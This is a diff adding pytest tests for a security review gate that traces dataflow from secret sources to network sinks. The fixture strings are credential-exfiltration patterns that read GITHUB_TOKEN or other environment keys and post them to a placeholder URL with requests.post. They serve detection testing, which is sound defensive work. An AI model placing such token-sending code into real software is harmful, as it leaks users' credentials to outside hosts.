@@ -388,3 +388,108 @@ def test_tails_round_trips_and_old_json_without_it_still_loads():
 
 def test_the_fixture_chain_still_passes_after_fix_round_3():
     assert chain.gate(_v(), chains.SHOWN) == ""
+
+
+# ---- Fix round 4 (controller rulings F1-F4) ----
+
+_SRC1 = 'token = os.environ.get("GITHUB_TOKEN",'
+_FAR_B = "pass\n" * 80 + "def b(token):\n    requests.post(U, data=token)\n"
+_ADJ = ('import os, requests\ndef a():\n    token = os.environ.get("GITHUB_TOKEN",\n                           "")\n'
+        '    requests.post(U, data=token)\n')
+
+
+@pytest.mark.parametrize("source, text", [
+    (_SRC1, 'import os, requests\ndef a():\n    token = os.environ.get("GITHUB_TOKEN",\n'
+            '                           "")\n    return token\n' + _FAR_B),
+    (_SRC1 + '\n"")', 'import os, requests\ndef a():\n    token = os.environ.get("GITHUB_TOKEN",\n'
+                      '                           "")\n    return token\n' + _FAR_B),
+    (_SRC1 + '\n"")', _ADJ),
+    (_SRC1, _ADJ),
+], ids=["first-line-far", "both-lines-far", "both-lines-adjacent", "first-line-adjacent"])
+def test_a_binding_line_that_opens_a_call_and_ends_with_a_comma_keeps_its_name(source, text):
+    # F1: rule (c) must not drop the bound NAME of `token = os.environ.get("K",` (the line opens a bracket).
+    v = _v(chain_source=source, chain_sink="requests.post(U, data=token)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_a_one_hop_from_a_binding_line_that_opens_a_call_connects():
+    text = ('import os, requests\ntoken = os.environ.get("GITHUB_TOKEN",\n                       "")\n' + "pass\n" * 80
+            + "def g():\n    v = token\n    requests.post(U, json=v)\n")
+    v = _v(chain_source=_SRC1, chain_sink="requests.post(U, json=v)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_names_rule_c_applies_when_the_line_opens_no_bracket_or_the_equals_touches_the_name():
+    assert chain._names(_SRC1) == {"token"}
+    assert chain._names("data=dict(a=token,") == {"token"}          # `=` touches `data`: a kwarg name
+    assert chain._names("data=token,") == {"token"}
+
+
+def test_a_continuation_kwarg_that_opens_a_bracket_does_not_share_its_name():
+    text = ('import os, requests\ndef a():\n    data = os.getenv("K")\n    return 1\n' + "pass\n" * 80
+            + 'def b(x):\n    requests.post(U,\n                  data=dict(a=x,\n                            b=1))\n')
+    v = _v(chain_source='data = os.getenv("K")', chain_sink='requests.post(U,\ndata=dict(a=x,\nb=1))')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+
+
+def test_a_black_continuation_kwarg_still_does_not_share_its_name_after_round_4():
+    text = ('import os, requests\ndef a():\n    data = os.getenv("K")\n    return 1\n' + "pass\n" * 80
+            + 'def b(x):\n    requests.post(\n        U,\n        data=x,\n    )\n')
+    v = _v(chain_source='data = os.getenv("K")', chain_sink='requests.post(\nU,\ndata=x,\n)')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+
+
+def test_a_form_feed_and_a_multibyte_string_do_not_break_the_shown_entry():
+    # F2: str.splitlines also splits on \x0c (and \x1c-\x1e, \x85,  ,  ); the AST does not. The shown
+    # lines keep the differ's splitlines numbering; strings/tails are mapped onto it and never raise.
+    text = 'import os\n\x0c\nX = ("""\naéééé\nb""" + y)\n'
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "build", whole=True)
+    assert entry["lines"][5] == "aéééé" and entry["lines"][6] == 'b""" + y)'
+    assert entry["strings"] == [5]
+    assert entry["tails"] == {6: 4}
+    assert entry["scopes"][6] == "module"
+
+
+def test_a_form_feed_inside_a_string_with_multibyte_text_does_not_raise():
+    text = 'import os, requests\ntoken = os.getenv("K")\nX = ("""\x0caéé\nc""" + requests.post(U, data=token))\n'
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "build", whole=True)
+    assert entry["lines"][4] == "aéé" and entry["strings"] == [4]
+    assert entry["tails"] == {5: 4}
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='c""" + requests.post(U, data=token))')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+@pytest.mark.parametrize("sep", ["\x0c", "\x1c", "\x85", " "])
+def test_a_splitlines_only_separator_before_a_chain_gates_the_same_as_without_it(sep):
+    body = 'token = os.getenv("K")\nx = foo("""abc\ndef""", requests.post(U, data=token))\n'
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='def""", requests.post(U, data=token))')
+    plain = chain.gate(v, _shown("pkg/a.py", "import os, requests\n" + body, cls="runtime-call"))
+    fed = chain.gate(v, _shown("pkg/a.py", "import os, requests\n# a" + sep + "b\n" + body, cls="runtime-call"))
+    assert plain == fed == ""
+
+
+def test_an_f_string_interior_line_does_not_read_as_a_hop():
+    # F3: an f-string's inner constant parts have real positions (3.12+); no tail inside an f-string, and a line
+    # inside a string is never a hop reader.
+    text = ('import os, requests\ndef g():\n    token = os.getenv("K")\n    return 1\n' + "pass\n" * 80
+            + 'def h(user):\n    msg = f"""hi\ndon\'t {user} forget your token\n"""\n    requests.post(U, json=msg)\n')
+    v = _v(chain_source='token = os.getenv("K")', chain_sink="requests.post(U, json=msg)")
+    shown = _shown("pkg/a.py", text, cls="runtime-call")
+    assert "tails" not in shown["pkg/a.py"]
+    assert chain.gate(v, shown) == "no dataflow shown between source and sink"
+    plain = text.replace("don't ", "please ")
+    assert chain.gate(v, _shown("pkg/a.py", plain, cls="runtime-call")) == "no dataflow shown between source and sink"
+
+
+def test_a_multiline_bytes_constant_counts_as_a_string():
+    # F4
+    text = ('import os, requests\ntoken = os.getenv("K")\n' + "pass\n" * 80
+            + 'B = (b"""\nx""" + """ requests.post(U, data=token)\nmore\n""")\n')
+    v = _v(chain_source='token = os.getenv("K")', chain_sink='x""" + """ requests.post(U, data=token)')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], 'B = b"""\nx\n"""\n'), "build", whole=True)
+    assert entry["strings"] == [2, 3]
+
+
+def test_the_fixture_chain_still_passes_after_fix_round_4():
+    assert chain.gate(_v(), chains.SHOWN) == ""
